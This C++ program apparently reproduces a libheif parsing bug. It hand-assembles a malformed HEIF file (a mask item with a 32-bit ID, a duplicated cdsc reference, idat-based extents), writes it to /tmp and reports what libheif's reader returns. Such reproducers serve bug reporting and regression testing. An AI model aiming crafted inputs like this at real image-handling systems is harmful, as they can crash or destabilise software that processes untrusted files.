#include <libheif/heif.h>

#include <cstdint>
#include <cstdio>
#include <fstream>
#include <iterator>
#include <vector>

namespace {

void append(std::vector<uint8_t>& out, const std::vector<uint8_t>& data)
{
  out.insert(out.end(), data.begin(), data.end());
}

void append_fourcc(std::vector<uint8_t>& out, const char* value)
{
  for (int i = 0; i < 4; i++) {
    out.push_back(static_cast<uint8_t>(value[i]));
  }
}

void append_cstr(std::vector<uint8_t>& out, const char* value)
{
  while (*value) {
    out.push_back(static_cast<uint8_t>(*value++));
  }
  out.push_back(0);
}

void put_u16_be(std::vector<uint8_t>& out, uint16_t value)
{
  out.push_back(static_cast<uint8_t>(value >> 8));
  out.push_back(static_cast<uint8_t>(value));
}

void put_u32_be(std::vector<uint8_t>& out, uint32_t value)
{
  out.push_back(static_cast<uint8_t>(value >> 24));
  out.push_back(static_cast<uint8_t>(value >> 16));
  out.push_back(static_cast<uint8_t>(value >> 8));
  out.push_back(static_cast<uint8_t>(value));
}

std::vector<uint8_t> make_box(const char* type,
                              const std::vector<uint8_t>& payload,
                              bool full = false,
                              uint8_t version = 0)
{
  std::vector<uint8_t> box;
  put_u32_be(box, static_cast<uint32_t>(8 + (full ? 4 : 0) + payload.size()));
  append_fourcc(box, type);
  if (full) {
    box.push_back(version);
    box.push_back(0);
    box.push_back(0);
    box.push_back(0);
  }
  append(box, payload);
  return box;
}

std::vector<uint8_t> build_heif_file()
{
  constexpr uint32_t primary_id = 0x10000;
  constexpr uint32_t metadata_id = 1;

  std::vector<uint8_t> ftyp_payload;
  append_fourcc(ftyp_payload, "heic");
  put_u32_be(ftyp_payload, 0);
  append_fourcc(ftyp_payload, "mif1");
  append_fourcc(ftyp_payload, "heic");
  const auto ftyp = make_box("ftyp", ftyp_payload);

  std::vector<uint8_t> hdlr_payload;
  put_u32_be(hdlr_payload, 0);
  append_fourcc(hdlr_payload, "pict");
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  hdlr_payload.push_back(0);
  const auto hdlr = make_box("hdlr", hdlr_payload, true);

  std::vector<uint8_t> pitm_payload;
  put_u32_be(pitm_payload, primary_id);
  const auto pitm = make_box("pitm", pitm_payload, true, 1);

  std::vector<uint8_t> image_infe_payload;
  put_u32_be(image_infe_payload, primary_id);
  put_u16_be(image_infe_payload, 0);
  append_fourcc(image_infe_payload, "mski");
  image_infe_payload.push_back(0);
  const auto image_infe = make_box("infe", image_infe_payload, true, 3);

  std::vector<uint8_t> metadata_infe_payload;
  put_u16_be(metadata_infe_payload, static_cast<uint16_t>(metadata_id));
  put_u16_be(metadata_infe_payload, 0);
  append_fourcc(metadata_infe_payload, "mime");
  append_cstr(metadata_infe_payload, "");
  append_cstr(metadata_infe_payload, "application/octet-stream");
  append_cstr(metadata_infe_payload, "");
  const auto metadata_infe = make_box("infe", metadata_infe_payload, true, 2);

  std::vector<uint8_t> iinf_payload;
  put_u16_be(iinf_payload, 2);
  append(iinf_payload, image_infe);
  append(iinf_payload, metadata_infe);
  const auto iinf = make_box("iinf", iinf_payload, true);

  std::vector<uint8_t> ispe_payload;
  put_u32_be(ispe_payload, 8);
  put_u32_be(ispe_payload, 8);
  const auto ispe = make_box("ispe", ispe_payload, true);

  std::vector<uint8_t> mask_config_payload;
  mask_config_payload.push_back(8);
  const auto mask_config = make_box("mskC", mask_config_payload, true);

  std::vector<uint8_t> ipco_payload;
  append(ipco_payload, ispe);
  append(ipco_payload, mask_config);
  const auto ipco = make_box("ipco", ipco_payload);

  std::vector<uint8_t> ipma_payload;
  put_u32_be(ipma_payload, 2);
  put_u32_be(ipma_payload, primary_id);
  ipma_payload.push_back(2);
  ipma_payload.push_back(0x80 | 1);
  ipma_payload.push_back(0x80 | 2);
  put_u32_be(ipma_payload, metadata_id);
  ipma_payload.push_back(0);
  const auto ipma = make_box("ipma", ipma_payload, true, 1);
  std::vector<uint8_t> iprp_payload;
  append(iprp_payload, ipco);
  append(iprp_payload, ipma);
  const auto iprp = make_box("iprp", iprp_payload);

  const std::vector<uint8_t> image_data(64, 0x7f);
  const std::vector<uint8_t> metadata_data{0, 0, 0, 0};
  std::vector<uint8_t> idat_payload;
  append(idat_payload, image_data);
  append(idat_payload, metadata_data);

  std::vector<uint8_t> iloc_payload;
  iloc_payload.push_back((4 << 4) | 4);
  iloc_payload.push_back(0);
  put_u32_be(iloc_payload, 2);
  put_u32_be(iloc_payload, primary_id);
  put_u16_be(iloc_payload, 0x0001);
  put_u16_be(iloc_payload, 0);
  put_u16_be(iloc_payload, 1);
  put_u32_be(iloc_payload, 0);
  put_u32_be(iloc_payload, static_cast<uint32_t>(image_data.size()));
  put_u32_be(iloc_payload, metadata_id);
  put_u16_be(iloc_payload, 0x0001);
  put_u16_be(iloc_payload, 0);
  put_u16_be(iloc_payload, 1);
  put_u32_be(iloc_payload, static_cast<uint32_t>(image_data.size()));
  put_u32_be(iloc_payload, static_cast<uint32_t>(metadata_data.size()));
  const auto iloc = make_box("iloc", iloc_payload, true, 2);

  std::vector<uint8_t> cdsc_payload;
  put_u32_be(cdsc_payload, metadata_id);
  put_u16_be(cdsc_payload, 2);
  put_u32_be(cdsc_payload, primary_id);
  put_u32_be(cdsc_payload, primary_id);
  const auto cdsc = make_box("cdsc", cdsc_payload);

  std::vector<uint8_t> iref_payload;
  append(iref_payload, cdsc);
  const auto iref = make_box("iref", iref_payload, true, 1);

  std::vector<uint8_t> meta_payload;
  append(meta_payload, hdlr);
  append(meta_payload, pitm);
  append(meta_payload, iinf);
  append(meta_payload, iprp);
  append(meta_payload, iloc);
  append(meta_payload, iref);
  append(meta_payload, make_box("idat", idat_payload));
  const auto meta = make_box("meta", meta_payload, true);

  std::vector<uint8_t> file;
  append(file, ftyp);
  append(file, meta);
  return file;
}

} // namespace

int main()
{
  const char* path = "/tmp/libheif-residual.heif";
  const auto data = build_heif_file();
  std::ofstream output(path, std::ios::binary);
  output.write(reinterpret_cast<const char*>(data.data()), static_cast<std::streamsize>(data.size()));
  if (!output) {
    std::fprintf(stderr, "failed to write %s\n", path);
    return 2;
  }
  output.close();

  heif_init(nullptr);
  heif_context* context = heif_context_alloc();
  const heif_error error = heif_context_read_from_file(context, path, nullptr);
  std::fprintf(stderr,
               "read result: code=%d subcode=%d message=%s\n",
               static_cast<int>(error.code),
               static_cast<int>(error.subcode),
               error.message ? error.message : "");
  heif_context_free(context);
  return error.code == heif_error_Ok ? 0 : 1;
}
